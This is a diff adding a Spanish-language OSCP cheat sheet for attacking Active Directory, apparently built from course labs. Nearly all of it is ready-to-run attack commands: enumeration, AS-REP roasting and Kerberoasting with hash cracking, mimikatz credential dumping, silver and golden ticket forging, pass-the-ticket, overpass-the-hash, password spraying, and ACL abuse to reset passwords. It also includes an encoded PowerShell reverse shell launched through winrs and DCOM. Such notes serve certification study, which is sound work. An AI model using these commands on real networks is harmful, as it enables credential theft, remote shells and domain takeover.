@@ -1,0 +1,186 @@
+##
+## Metodologia para OSCP
+## Seccion para Active Directory
+## Autor: Ernesto Vazquez
+## Fecha: 9/30/203
+## Tottix 
+## info@tottix.com
+##
+
+#### ENUMERACION ####
+
+1. Enumerar Usuarios
+    cmd> net user /domain
+    PS PowerView> Get-NetUser
+    PS PowerView> Get-NetUser | select cn
+
+2. Enumerar las propiedades de cada usuario. Poner bastante atencion a que grupos pertenecen.
+    cmd> net user <usuario> /domain
+    PS PowerView> Get-NetUser "usuario"
+
+3. Enumerar Grupos, poner bastante atencion a grupos que nos son predeterminados.
+    cmd> net group /domain
+    PS PowerView> Get-NetGroup | select cn
+
+4. Enumerar las propiedades de cada grupo. Poner bastante atencion a los miembros de cada grupo.
+    cmd> net group "grupo" /domain
+    PS PowerView> Get-NetGroup "grupo" | select member
+    PS PowerView> Get-NetGroup | select cn,member | where-object {$_.member -like '*usuario*'}
+
+5. Enumerar todos los servidores y Sistemas Operativos dentro del dominio.
+    PS PowerView> Get-NetComputer | select operatingsystem,dnshostname
+
+6. Enumerar las propiedades de cada servidor.
+    PS PowerView> Get-NetComputer "nombre de dominio del servidor"
+
+7. Enumerar todas las sesiones activas de usuario de un determinado servidor.
+    PS PowerView> Get-NetSession -ComputerName <servidor> -Verbose
+
+8. Identificar servidores donde el tu usuario Administrador local.
+    PS PowerView> Find-LocalAdminAccess
+
+9. Enumerar todos los nombres de Entidades de Servicio (Service Principal Names - SPNs) 
+    cmd> setspn -L <service account>
+    PS PowerView> Get-NetUser -SPN | select samaccountname,serviceprincipalname
+
+10. Enumerar las listas de Control de Access (Access Contronl List - ACLs) por cada usuario y grupo.
+    # Tomar nota de los atributos: ActiveDirectoryRights, ObjectSID y SecurityIdentifier
+    PS PowerView> Get-ObjectAcl -Identity tommy
+    # Si encuentras algun privilegio interesante en ActiveDirectoryRights, copia y busca el SecurityIdentifier
+    PS PowerView> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
+    # Tambien es posible filtrar por privilegio, ej. 'GenericAll'
+    PS PowerView> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+    # Tambien podemos convertir los SIDs a nombres
+    PS PowerView> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
+    # Si encontramos un usuario con privilegios de GenericAll sobre un grupo, lo podemos agregar de la siguiente manera
+    > net group "Management Department" tommy /add /domain
+    # Si encontramos que tenemos privilegios de GenericAll sobre un usuario, podemos cambiar su contrasena de la siguiente manera.
+    > net user tommy_admin Password123 /domain
+
+11. Enumerar los Shares en el Dominio
+    PS PowerView> Find-DomainShare
+    PS PowerView> Find-DomainShare -CheckShareAccess
+    # Siempre revisamos por las politicas en SYSVOL.
+    PS> ls \\dc1.corp.com\sysvol\corp.com\Policies\
+    # Desencriptar contrasenas de tipo Windows Policy
+    $ gpp-decrypt 'encrypted-password'
+
+12. Automatizar la enumeracion de un Dominio con Sharphound.
+    PS> Import-Module .\Sharphound.ps1
+    PS> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "auditoria"
+    $ bloodhound-python -u stephanie -p 'LegmanTeamBenzoin!!' -d corp.com -ns 192.168.248.70 -c all
+
+13. Buscar los entidades dentro del dominio, sin Pre-Authentication para ataque de AS-REProast.
+	# Usando Kali
+    $ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete 
+    $ impacket-GetNPUsers -dc-ip 192.168.50.70 -usersfile lista_de_usuarios.txt -format hashchat -outputfile hashes.asreproast
+    # Usuando Windows
+    PS PowerView> Get-DomainUser -PreauthNotRequired # Enumeracion de usuarios
+    PS> .\Rubeus.exe asreproast /nowrap
+    # Crackear contrasena usuando Hashcat.
+    $ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+14. Encontrar Entidades de Servicio (SPNs) para ataque de Kerberoast.
+    # Usando Kali
+    $ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+    # Usuando Windows
+    PS> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+    $ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+15. Atancado Kerberos, Silver tickets.
+    # Requires SPN password hash, Domain SID of current user and Target SPN.
+    # As an administrator get the NTLM hash of the vulnerable service account.
+    mimikatz# sekurlsa::logonpasswords
+    # get the SID of the domain, you can find it on the user's sid, remember to remove RID, last digits of SID.
+    > whoami /user
+    # Create ticket.
+    mimikatz# kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+
+16. Atacando Kerberos, Golden ticket.
+	# Obtener el hash NTLM de la cuenta krbtgt usando mimkatz
+    mimikatz# lsadump::lsa /patch
+    # Purge and create golden ticket.
+    # Purgar y obtener un Golden ticket
+    mimikatz# kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+    mimikatz# misc::cmd
+
+17. Ejecutar comandos remotos usando Windows para Active Directory.
+    winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgA1ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+    # Usando DCOM (Powershell)
+    PS> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+    PS> $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgA1ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==","7")
+    # Ataque Pass-The-Ticket 
+    # Primero, exportamos todos los tickets de memoria al disco.
+    mimikatz# privilege::debug
+    mimikatz# sekurlsa::tickets /export
+    # listamos todos los tickets.
+    > dir *.kirbi
+    # finalmente pasamos el ticket con mimikatz
+    mimikatz# kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+
+18. Ataque Overpass-The-Hash
+	# En case de tener aceso de Administrador Local y un hash de un usuario dentro del domino, podemos hacer un ataque de overpass-the-has con mimikatz
+    mimikatz# sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+
+19. Ataque SprayPassword.
+	# Si encontramos una contrasena, podemos intentar usarla contra todos los usuarios dentro del dominio.
+    $ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+    $ crackmapexec smb 127.0.0.1 -u exploit/domain_users.txt -p 'hghgib6vHT3bVWf' --local-auth
+
+##
+## Movimineto Lateral
+##
+
+1. Buscar puertos abiertos en otros equipos dentro de la red usando powershell.
+    1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.83.142", $_)) "TCP port $_ is open" } 2> $null
+    
+# Codigo en Powershell para hacer LDAP queries.
+# Bastante de este codigo esta basado en el manual provisto por OffSec para el curso PEN-200.
+
+function LDAPSearch {
+    param (
+        [string]$LDAPQuery
+    )
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    $DistinguishedName = ([adsi]'').distinguishedName
+    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+    return $DirectorySearcher.FindAll()
+
+}
+
+Como usar el script dentro de Powershell:
+Import-Module .\script.ps1
+LDAPSearch -LDAPQuery "(samAccountType=805306368)" # Enumerar usuarios
+LDAPSearch -LDAPQuery "(objectclass=group)" # Enumerar grupos.
+foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.properties | select {$_.cn}, {$_.member} } # Enumerar grupos y sus miembros
+$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Management Department*))" # buscar usuario dentro de un grupo determinado
+$group.properties.member
+
+## Script en powershell para econtrar objetos con privileges interesantes dentro del dominio.
+## El siguiente archivo require PowerView.
+
+$InterestingPrivileges = "GenericAll", "GenericWrite", "WriteOwner", "WriteDACL", "AllExtendedRights","ForceChangePassword","Self"
+$Users = Get-NetUser | select cn
+$Groups = Get-NetGroup | select cn 
+$ObjectNames = $Users + $Groups 
+
+foreach ($object in $ObjectNames) {
+    foreach ($privilege in $InterestingPrivileges) {
+	  $acl = Get-ObjectAcl -Identity $object.cn | Where-Object { $_.ActiveDirectoryRights -eq $privilege } | select ObjectSID,SecurityIdentifier,ActiveDirectoryRights
+	  foreach ($ace in $acl) {
+		$principal = Convert-SidToName $ace.SecurityIdentifier
+		if ($ace.ObjectSID) {
+			$obj =  Convert-SidToName $ace.ObjectSID
+		}
+		$principal, $privilege, $obj -join ' -> ' 
+	  }
+    }
+}
+
+## Script en Powershell para buscar sessiones activas dentro de servidores que pertenecen al dominio.
+## Require de PowerView.
+$Computers = Get-NetComputer | select cn
+foreach ($computer in $Computers) {
+    Get-NetSession -ComputerName $computer -Verbose
+}
